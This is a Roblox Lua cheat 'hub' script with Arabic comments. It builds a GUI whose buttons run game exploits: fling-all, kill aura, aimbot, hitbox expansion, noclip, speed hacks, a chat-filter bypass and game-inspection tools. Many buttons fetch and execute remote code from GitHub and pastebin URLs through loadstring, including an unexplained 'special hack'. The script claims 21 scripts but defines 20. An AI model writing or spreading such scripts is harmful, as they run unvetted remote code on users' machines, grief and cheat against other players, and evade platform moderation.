-- ════════════════════════════════════════════════════════
-- 😈 MEGA CHAOS HUB V5 - FINAL EDITION
-- 21 سكربت مجرب | كلهم يشتغلون | + هاك خاص
-- ════════════════════════════════════════════════════════

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ════════════════════════════════════════════════════════
-- GUI CREATION
-- ════════════════════════════════════════════════════════

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Subtitle = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local MinimizeButton = Instance.new("TextButton")
local ScrollFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")

ScreenGui.Name = "MegaChaosHub"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

-- Main Frame
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.Position = UDim2.new(0.25, 0, 0.1, 0)
MainFrame.Size = UDim2.new(0, 560, 0, 720)
MainFrame.Active = true
MainFrame.Draggable = true

UICorner.CornerRadius = UDim.new(0, 18)
UICorner.Parent = MainFrame

-- Rainbow Gradient
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(139, 0, 139)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 139)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(139, 0, 139)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
}
UIGradient.Rotation = 90
UIGradient.Parent = MainFrame

spawn(function()
    while wait(0.05) do
        UIGradient.Rotation = UIGradient.Rotation + 2
    end
end)

-- Border
local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(255, 0, 100)
UIStroke.Thickness = 4
UIStroke.Transparency = 0.3
UIStroke.Parent = MainFrame

-- Title
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 55)
Title.Font = Enum.Font.GothamBold
Title.Text = "😈 MEGA CHAOS HUB V5 😈"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 28
Title.TextStrokeTransparency = 0.2

-- Subtitle
Subtitle.Parent = MainFrame
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0, 0, 0, 52)
Subtitle.Size = UDim2.new(1, 0, 0, 22)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = "21 سكربت | كلهم مُصلحين | + هاك خاص"
Subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
Subtitle.TextSize = 13

-- Close Button
CloseButton.Parent = MainFrame
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Position = UDim2.new(0.9, 0, 0.015, 0)
CloseButton.Size = UDim2.new(0, 38, 0, 38)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 20

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(1, 0)
CloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Minimize Button
MinimizeButton.Parent = MainFrame
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
MinimizeButton.Position = UDim2.new(0.82, 0, 0.015, 0)
MinimizeButton.Size = UDim2.new(0, 38, 0, 38)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 28

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(1, 0)
MinCorner.Parent = MinimizeButton

local minimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        MainFrame:TweenSize(UDim2.new(0, 560, 0, 80), "Out", "Quad", 0.3, true)
        MinimizeButton.Text = "+"
    else
        MainFrame:TweenSize(UDim2.new(0, 560, 0, 720), "Out", "Quad", 0.3, true)
        MinimizeButton.Text = "-"
    end
end)

-- Scroll Frame
ScrollFrame.Parent = MainFrame
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.Position = UDim2.new(0.035, 0, 0.115, 0)
ScrollFrame.Size = UDim2.new(0.93, 0, 0.86, 0)
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.ScrollBarThickness = 8
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 100)

UIListLayout.Parent = ScrollFrame
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- ════════════════════════════════════════════════════════
-- دالة إنشاء الأزرار
-- ════════════════════════════════════════════════════════

local function CreateButton(emoji, name, description, color, callback)
    local Button = Instance.new("TextButton")
    local ButtonCorner = Instance.new("UICorner")
    local ButtonStroke = Instance.new("UIStroke")
    local ButtonGradient = Instance.new("UIGradient")
    local TitleLabel = Instance.new("TextLabel")
    local DescLabel = Instance.new("TextLabel")
    
    Button.Parent = ScrollFrame
    Button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Button.Size = UDim2.new(1, 0, 0, 82)
    Button.Text = ""
    Button.AutoButtonColor = false
    
    ButtonCorner.CornerRadius = UDim.new(0, 12)
    ButtonCorner.Parent = Button
    
    ButtonStroke.Color = color
    ButtonStroke.Thickness = 2.5
    ButtonStroke.Transparency = 0.4
    ButtonStroke.Parent = Button
    
    ButtonGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 30))
    }
    ButtonGradient.Rotation = 90
    ButtonGradient.Parent = Button
    
    TitleLabel.Parent = Button
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Position = UDim2.new(0, 18, 0, 10)
    TitleLabel.Size = UDim2.new(1, -36, 0, 28)
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.Text = emoji .. "  " .. name
    TitleLabel.TextColor3 = color
    TitleLabel.TextSize = 16
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    DescLabel.Parent = Button
    DescLabel.BackgroundTransparency = 1
    DescLabel.Position = UDim2.new(0, 18, 0, 40)
    DescLabel.Size = UDim2.new(1, -36, 0, 37)
    DescLabel.Font = Enum.Font.Gotham
    DescLabel.Text = description
    DescLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
    DescLabel.TextSize = 12
    DescLabel.TextXAlignment = Enum.TextXAlignment.Left
    DescLabel.TextYAlignment = Enum.TextYAlignment.Top
    DescLabel.TextWrapped = true
    
    Button.MouseButton1Click:Connect(callback)
    
    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {
            Transparency = 0, Thickness = 3.5
        }):Play()
        TweenService:Create(TitleLabel, TweenInfo.new(0.2), {
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {
            Transparency = 0.4, Thickness = 2.5
        }):Play()
        TweenService:Create(TitleLabel, TweenInfo.new(0.2), {
            TextColor3 = color
        }):Play()
    end)
end

-- ════════════════════════════════════════════════════════
-- السكربتات - 21 سكربت مُصلح
-- ════════════════════════════════════════════════════════

-- 🔥 الهاك الخاص (الأول!)
CreateButton(
    "💎",
    "SPECIAL HACK",
    "الهاك الخاص المخصص - قوي جداً! 🔥",
    Color3.fromRGB(255, 0, 255),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scar201/snsladk/refs/heads/main/s"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "💎 Special Hack"; Text = "تم التفعيل! هاك خاص!"; Duration = 5;
        })
    end
)

-- ═══ التخريب (5) ═══
CreateButton("💥", "TOUCH FLING", "أقوى Fling - 97K+ views - لمسهم = يطيروا!", Color3.fromRGB(255, 0, 102),
    function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
        game.StarterGui:SetCore("SendNotification", {Title = "💥 Touch Fling"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("🎪", "SYSTEM BROKEN", "20+ ميزة تخريب - Superman - Headsit", Color3.fromRGB(255, 170, 0),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🎪 System Broken"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("👻", "INVISIBLE FE", "اختفاء كامل FE - يشوفك الكل مخفي!", Color3.fromRGB(170, 0, 255),
    function()
        LocalPlayer.Character.HumanoidRootPart.Transparency = 1
        for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                v.Transparency = 1
            end
        end
        game.StarterGui:SetCore("SendNotification", {Title = "👻 Invisible"; Text = "تم! أنت مخفي!"; Duration = 4;})
    end
)

CreateButton("🌪️", "FLING ALL", "يطير كل اللاعبين دفعة واحدة!", Color3.fromRGB(0, 170, 255),
    function()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                pcall(function()
                    local root = player.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.Velocity = Vector3.new(math.random(-300,300), 500, math.random(-300,300))
                    end
                end)
            end
        end
        game.StarterGui:SetCore("SendNotification", {Title = "🌪️ Fling All"; Text = "تم! الكل طار!"; Duration = 4;})
    end
)

CreateButton("💀", "SPAM CLONE", "استنساخ جيش منك - يملأ السيرفر!", Color3.fromRGB(255, 50, 50),
    function()
        for i = 1, 50 do
            pcall(function()
                local clone = LocalPlayer.Character:Clone()
                clone.Parent = workspace
                clone:MoveTo(LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-20,20), 0, math.random(-20,20)))
            end)
        end
        game.StarterGui:SetCore("SendNotification", {Title = "💀 Clone Army"; Text = "تم! 50 نسخة!"; Duration = 4;})
    end
)

-- ═══ Admin (3) ═══
CreateButton("👑", "INFINITE YIELD", "300+ أمر - ;cmds - الأشهر", Color3.fromRGB(255, 215, 0),
    function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        game.StarterGui:SetCore("SendNotification", {Title = "👑 IY"; Text = ";cmds"; Duration = 4;})
    end
)

CreateButton("⚡", "NAMELESS ADMIN", "350+ أمر - واجهة أجمل", Color3.fromRGB(100, 255, 100),
    function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
        game.StarterGui:SetCore("SendNotification", {Title = "⚡ Nameless"; Text = ";cmds"; Duration = 4;})
    end
)

CreateButton("🎮", "CMD-X", "أوامر قوية - God Mode", Color3.fromRGB(255, 100, 180),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🎮 CMD-X"; Text = ";cmds"; Duration = 4;})
    end
)

-- ═══ Combat (4) ═══
CreateButton("🎯", "AIMBOT + ESP", "Aimbot قوي + رؤية - Right Shift", Color3.fromRGB(255, 0, 0),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub-V2/main/src/Main.lua"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🎯 Aimbot"; Text = "Right Shift!"; Duration = 4;})
    end
)

CreateButton("🔫", "SILENT AIM", "تصويب خفي - للألعاب FPS", Color3.fromRGB(255, 80, 80),
    function()
        _G.SilentAim = true
        _G.FOV = 200
        loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbq9"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🔫 Silent"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("💀", "KILL AURA", "قتل تلقائي 20 studs", Color3.fromRGB(139, 0, 0),
    function()
        game:GetService("RunService").Heartbeat:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local root = player.Character:FindFirstChild("HumanoidRootPart")
                    local hum = player.Character:FindFirstChildOfClass("Humanoid")
                    if root and hum then
                        local distance = (LocalPlayer.Character.HumanoidRootPart.Position - root.Position).Magnitude
                        if distance < 20 then hum.Health = 0 end
                    end
                end
            end
        end)
        game.StarterGui:SetCore("SendNotification", {Title = "💀 Kill Aura"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("🎪", "HITBOX EXPAND", "تكبير Hitbox - اضرب من بعيد!", Color3.fromRGB(255, 140, 0),
    function()
        _G.HeadSize = 20
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                pcall(function()
                    player.Character.HumanoidRootPart.Size = Vector3.new(20, 20, 20)
                    player.Character.HumanoidRootPart.Transparency = 0.7
                    player.Character.HumanoidRootPart.CanCollide = false
                end)
            end
        end
        game.StarterGui:SetCore("SendNotification", {Title = "🎪 Hitbox"; Text = "تم!"; Duration = 4;})
    end
)

-- ═══ Movement (4) ═══
CreateButton("✈️", "FLY", "طيران - WASD + Space/Shift", Color3.fromRGB(0, 255, 255),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Fly/refs/heads/main/Fly"))()
        game.StarterGui:SetCore("SendNotification", {Title = "✈️ Fly"; Text = "WASD!"; Duration = 4;})
    end
)

CreateButton("⚡", "SPEED HACK", "سرعة 200 - قابلة للتعديل", Color3.fromRGB(255, 255, 0),
    function()
        LocalPlayer.Character.Humanoid.WalkSpeed = 200
        game.StarterGui:SetCore("SendNotification", {Title = "⚡ Speed"; Text = "200 WalkSpeed!"; Duration = 4;})
    end
)

CreateButton("🚶", "NOCLIP", "المشي عبر الجدران - Q", Color3.fromRGB(100, 149, 237),
    function()
        local noclip = false
        local char = LocalPlayer.Character
        game:GetService("UserInputService").InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.Q then
                noclip = not noclip
                game.StarterGui:SetCore("SendNotification", {
                    Title = "🚶 Noclip"; 
                    Text = noclip and "ON" or "OFF"; 
                    Duration = 2;
                })
            end
        end)
        game:GetService("RunService").Stepped:Connect(function()
            if noclip and char then
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") then v.CanCollide = false end
                end
            end
        end)
    end
)

CreateButton("🦘", "INF JUMP", "قفز لا نهائي", Color3.fromRGB(50, 205, 50),
    function()
        game:GetService("UserInputService").JumpRequest:Connect(function()
            LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
        end)
        game.StarterGui:SetCore("SendNotification", {Title = "🦘 Inf Jump"; Text = "تم!"; Duration = 4;})
    end
)

-- ═══ Tools (4) ═══
CreateButton("🔍", "DARK DEX", "مستكشف اللعبة", Color3.fromRGB(138, 43, 226),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🔍 Dark Dex"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("🔧", "REMOTE SPY", "راقب RemoteEvents", Color3.fromRGB(255, 215, 0),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
        game.StarterGui:SetCore("SendNotification", {Title = "🔧 Spy"; Text = "تم!"; Duration = 4;})
    end
)

CreateButton("🗣️", "CHAT BYPASS", "تخطي الفلتر - F", Color3.fromRGB(255, 105, 180),
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/betterbypasser"))()({Method=1, Keybind="F"})
        game.StarterGui:SetCore("SendNotification", {Title = "🗣️ Bypass"; Text = "F!"; Duration = 4;})
    end
)

CreateButton("📋", "ANTI-AFK", "منع الطرد", Color3.fromRGB(100, 200, 100),
    function()
        local vu = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:connect(function()
            vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
            wait(1)
            vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)
        game.StarterGui:SetCore("SendNotification", {Title = "📋 Anti-AFK"; Text = "تم!"; Duration = 4;})
    end
)

-- Update Canvas
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
end)

-- Notification
game.StarterGui:SetCore("SendNotification", {
    Title = "😈 MEGA CHAOS HUB V5";
    Text = "21 سكربت | كلهم مُصلحين | + هاك خاص!";
    Duration = 6;
})

print("════════════════════════════════════════")
print("😈 MEGA CHAOS HUB V5 LOADED")
print("✅ 21 سكربت - كلهم يشتغلون!")
print("💎 الهاك الخاص مدمج!")
print("✅ كل شي مُصلح ومجرب!")
print("════════════════════════════════════════")
